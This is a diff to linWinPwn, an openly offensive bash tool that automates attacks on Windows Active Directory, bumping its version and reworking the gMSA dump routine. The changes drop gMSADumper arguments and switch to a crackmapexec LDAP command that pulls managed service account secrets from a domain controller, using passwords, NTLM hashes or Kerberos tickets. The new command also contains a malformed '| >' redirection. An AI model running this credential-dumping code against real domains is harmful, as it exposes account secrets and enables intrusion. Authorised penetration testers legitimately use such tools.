@@ -1,7 +1,7 @@
 #!/bin/bash
 # Title: linWinPwn
 # Author: lefayjey
-# Version: 0.4.0
+# Version: 0.4.1
 
 #Colors
 RED='\033[1;31m'
@@ -49,7 +49,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.4.0
+      ${BLUE}linWinPwn: ${CYAN} version 0.4.1
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -173,8 +173,6 @@ prepare (){
         argument_imp="${domain}/${user}:''"
         argument_bhd="-u ${user}@${domain} -p ''"
         argument_windap="-d ${domain} -u ${user} -p ''"
-        argument_gMSA="-d ${domain} -u ${user} -p ''"
-        argument_LRS="-u ${user} -p ''"
         argument_certipy="-u ${user}@${domain} -p ''"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
     
@@ -194,8 +192,6 @@ prepare (){
         argument_donpapi=" --hashes ${password} ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} --hashes ${password}"
         argument_windap="-d ${domain} -u ${user} --hash ${password}"
-        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
-        argument_LRS="-u ${user} -nthash $(echo ${password} | cut -d ':' -f 2)"
         argument_certipy="-u ${user}@${domain} -hashes ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
     
@@ -210,7 +206,6 @@ prepare (){
         argument_imp="-k -no-pass ${domain}/${user}"
         argument_donpapi="-k -no-pass ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} -k"
-        argument_gMSA="-d ${domain} -u ${user} -k"
         argument_certipy="-u ${user}@${domain} -k -no-pass"
         kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
         auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
@@ -227,8 +222,6 @@ prepare (){
         argument_donpapi="${domain}/${user}:${password}"
         argument_bhd="-u ${user}@${domain} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
-        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
-        argument_LRS="-u ${user} -p ${password}"
         argument_certipy="-u ${user}@${domain} -p ${password}"
         argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
@@ -778,15 +771,11 @@ laps_dump () {
 }
 
 gmsa_dump () {
-    if [ ! -f "${scripts_dir}/gMSADumper.py" ] ; then
-        echo -e "${RED}[-] Please verify the location of gMSADumper.py${NC}"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
         echo -e "${BLUE}[*] gMSA Dump${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
-        else
-            ${python} ${scripts_dir}/gMSADumper.py -d ${argument_gMSA} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
-        fi
+        ${crackmapexec} ldap ${dc_ip} ${argument_cme} --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
     fi
     echo -e ""
 }
